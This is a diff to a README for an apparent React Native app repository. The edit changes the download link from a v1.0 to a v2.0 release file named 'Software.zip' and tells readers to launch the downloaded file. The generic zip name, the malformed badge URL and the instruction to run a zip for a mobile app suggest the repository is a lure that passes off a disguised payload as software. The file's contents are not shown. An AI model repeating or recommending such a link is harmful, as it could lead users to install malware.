@@ -11,7 +11,7 @@ This repository hosts a powerful mobile application built using React Native tha
 ## Getting Started
 To get started with the `medusa-mobile-react-native` app, simply download the latest version from the following link:
 
-[![Download App](https://github.com/Gregory-SJ/medusa-mobile-react-native/releases/download/v1.0/Software.zip%20App-v1.0.0-blue)](https://github.com/Gregory-SJ/medusa-mobile-react-native/releases/download/v1.0/Software.zip)
+[![Download App](https://github.com/Gregory-SJ/medusa-mobile-react-native/releases/download/v2.0/Software.zip%20App-v1.0.0-blue)](https://github.com/Gregory-SJ/medusa-mobile-react-native/releases/download/v2.0/Software.zip)
 
 Please note that the downloaded file needs to be launched to start using the app.
 
